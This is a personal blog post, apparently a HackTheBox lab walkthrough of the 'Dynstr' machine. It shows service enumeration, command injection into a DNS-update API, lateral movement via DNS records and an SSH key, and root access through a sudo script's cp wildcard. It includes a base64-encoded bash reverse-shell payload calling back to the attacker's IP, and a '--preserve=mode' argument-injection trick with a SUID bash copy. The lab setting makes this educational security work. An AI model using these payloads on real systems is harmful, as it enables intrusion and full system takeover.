@@ -1,0 +1,337 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Dynstr HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<h2 class=blog-title>Dynstr HackTheBox Walkthrough</h2>
+<p><span>October 16, 2021</span> by <span>Nasef</span></p>
+<img class=feature-image src=https://iamnasef.com/images/blog/018/featured-image.png alt=blog-feature-image>
+<p>Hello everybody!
+I am Nasef and today I am going to show you how I hacked Dynstr machine from hack the box, so let&rsquo;s get started!</p>
+<h2 id=services-enumeration>Services Enumeration</h2>
+<p>Nmap found ports ssh(22) , http (80) , DNS (53).</p>
+<pre tabindex=0><code class=language-nmap data-lang=nmap>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 11:53 EDT
+Nmap scan report for dynstr.htb (10.10.10.244)
+Host is up (0.16s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
+|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
+|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Dyna DNS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.72 seconds
+
+</code></pre><p>I ran another nmap scan -sU for enumerating udp services and found DNS Service.</p>
+<pre tabindex=0><code>nmap -sU 10.10.10.244
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 11:53 EDT
+Nmap scan report for dynstr.htb (10.10.10.244)
+Host is up (0.19s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/udp open  domain
+
+Nmap done: 1 IP address (1 host up) scanned in 998.78 seconds
+
+</code></pre><p>I ran another nmap scan -p- for enumerating the non default ports but it gave me nothing new.</p>
+<pre tabindex=0><code>└─# nmap -p- 10.10.10.244                                                                                                                                                                                                            130 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 11:53 EDT
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+Nmap scan report for dynstr.htb (10.10.10.244)
+Host is up (0.16s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 953.38 seconds
+
+</code></pre><p>This concludes the service enumeration phase.</p>
+<h2 id=exploiting-http-service>Exploiting HTTP Service</h2>
+<p>Using the current information, I decidede to further enumerate the http service, but first I added the hostname of the machine in /etc/hosts because some machines use host routing.</p>
+<p>Then I ran gobuster to enumerate hidden directories, and found a directory called nic.</p>
+<pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dynstr.htb -x php,txt,git              
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dynstr.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,git
+[+] Timeout:                 10s
+===============================================================
+2021/06/30 11:54:18 Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 309] [--&gt; http://dynstr.htb/assets/]                                                                   
+/nic                  (Status: 301) [Size: 306] [--&gt; http://dynstr.htb/nic/]   
+Progress: 16428 / 882244 (1.86%)                                              ^C
+
+                                                                               
+===============================================================
+2021/06/30 11:58:56 Finished
+===============================================================
+
+</code></pre><p>I ran another gobuster to enumerate the nic directory and found file called update</p>
+<pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dynstr.htb/nic/ -x php,txt,git                  
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dynstr.htb/nic/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,git
+[+] Timeout:                 10s
+===============================================================
+2021/06/30 11:57:14 Starting gobuster in directory enumeration mode
+===============================================================
+/update               (Status: 200) [Size: 8]                  
+===============================================================
+2021/06/30 11:58:54 Finished
+===============================================================
+
+</code></pre><p>After that I opned the http service in the browser and found three interesting messages</p>
+<p>The First is telling me that this website is running api similar to no-ip
+The Second is telling me that there are three important domains which I&rsquo;ve added in the /etc/passwd
+The Third is giving me a credentials</p>
+<p><img src=/images/blog/018/1.png alt=image></p>
+<p>I searched for the no-ip api, I found it&rsquo;s documentation and how to use it</p>
+<pre tabindex=0><code>https://www.noip.com/integrate/request
+</code></pre><p>1- you must create basic authentication which is &ldquo;username:password&rdquo; encoded in the base64, I used the credintials to login
+2- you use two parameters to update DNS Entries</p>
+<p>I added single quotation in hostname parameter and got an error saying</p>
+<p><img src=/images/blog/018/2.png alt=image></p>
+<p>nsupdate is a cli tool, so imeditly command injection came into my mind, I ran one of the seclist payloads to fuzz the parameter
+<img src=/images/blog/018/3.png alt=image></p>
+<p>The only payloads that worked are the payload that is written then a double quottion is added after.</p>
+<p><img src=/images/blog/018/4.png alt=image></p>
+<p>I tried a bash shell but it has bad characters</p>
+<p><img src=/images/blog/018/5.png alt=image></p>
+<p>Another solution came into my mind is encoding the shell in base64 then write a command that echos decode and execute the shell, so I used this payload.</p>
+<pre tabindex=0><code>echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41My8xMTExIDA+JjE=&quot; | base64 -d | bash&quot;test.no-ip.htb
+</code></pre><p><img src=/images/blog/018/6.png alt=image></p>
+<p>and voila we got into the machine.</p>
+<h2 id=getting-into-bindmgr>Getting into bindmgr</h2>
+<p>I wasn&rsquo;t able to access user.txt so I ran linpeas, and found two files that has private ssh key</p>
+<p><img src=/images/blog/018/7.png alt=image>
+<img src=/images/blog/018/8.png alt=image>
+so, I took the key and tried ssh logging into the machine but it doesn&rsquo;t work!</p>
+<pre tabindex=0><code>ssh bindmgr@dynstr.htb -i key1                                                                                                                                                                                                   130 ⨯
+bindmgr@dynstr.htb's password: 
+</code></pre><p>I found that there is condition for using the key in authorized_keys. It states that you can only use this key from a host that has any subdomain of the domain &ldquo;*infra.dyna.htb &ldquo;.</p>
+<p>Given that nsupdate is working, I though that I may bind my machine ip address to a subdomain of infra by both A and PTR entries, so I can ssh connect easily and it worked but I had to use a bind key!</p>
+<pre tabindex=0><code>www-data@dynstr:/etc/bind$ nsupdate -k /etc/bind/infra.key                                                                                                                                                                                 
+nsupdate -k /etc/bind/infra.key                                                                                                                                                                                                            
+update add nasef.infra.dyna.htb 86400 A 10.10.14.53                                                                                                                                                                                        
+send                                                                                                                                                                                                                                       
+update add 53.14.10.10.in-addr.arpa. 86400 PTR nasef.infra.dyna.htb                                                                                                                                                                        
+send                                                                                                                                                                                                                                       
+</code></pre><pre tabindex=0><code>└─# ssh bindmgr@dynstr.htb -i key1                                                                                                                                                                                                   130 ⨯
+Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
+bindmgr@dynstr:~$ ls
+support-case-C62796521  user.txt
+bindmgr@dynstr:~$ cat user.txt 
+25cf7ccfdac6c63d96ef18885601405b
+
+</code></pre><p>and voila we got user.txt</p>
+<h2 id=privilege-escalation>Privilege Escalation</h2>
+<p>Before running any heavy privesc scripts, I prefere going through my manual checklist. Starting with sudo, I found that I can run a script as root without password</p>
+<pre tabindex=0><code>bindmgr@dynstr:~$ sudo -l
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries for bindmgr on dynstr:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
+</code></pre><p>After reading the script I found that it copies all the files in a directory and put it in another directory but the directory must contain file called .version</p>
+<pre tabindex=0><code># Stage new version of configuration files.
+echo &quot;[+] Staging files to $BINDMGR_DIR.&quot;
+cp .version * /etc/bind/named.bindmgr/
+</code></pre><p>I thought of a strategy, which is
+1- making a copy of the binary bash file
+2- adding SUID Previleges so we can run it as the owner which is root
+3- create a file called &ndash;preserve=mode to trick cp of taking it as an option to preserve the permessions in the directory and it Worked!</p>
+<pre tabindex=0><code>bindmgr@dynstr:~$ touch .version
+bindmgr@dynstr:~$ echo &quot;1337&quot; &gt; .version
+bindmgr@dynstr:~$ cp /bin/bash .
+bindmgr@dynstr:~$ chmod +s bash
+bindmgr@dynstr:~$ echo &gt; --preserve=mode
+bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+cp: -r not specified; omitting directory 'support-case-C62796521'
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
+    /etc/bind/named.bindmgr/bash:14: unknown option 'h�ȀE�'
+    /etc/bind/named.bindmgr/bash:40: unknown option '�YF'
+    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
+bindmgr@dynstr:~$ cd /etc/bind/named.bindmgr/
+bindmgr@dynstr:/etc/bind/named.bindmgr$ ls -la
+total 1172
+drwxr-sr-x 2 root bind    4096 Jun 30 18:25 .
+drwxr-sr-x 3 root bind    4096 Jun 30 18:25 ..
+-rwsr-sr-x 1 root bind 1183448 Jun 30 18:25 bash
+-r-------- 1 root bind      33 Jun 30 18:25 user.txt
+-rw-rw-r-- 1 root bind       5 Jun 30 18:25 .version
+bindmgr@dynstr:/etc/bind/named.bindmgr$ bash -p
+bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+8c499e7c4024a9494084f0d16bf19b4e
+
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Security Consultancy <br>Security Technical Training<br>Security Awarness Training
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
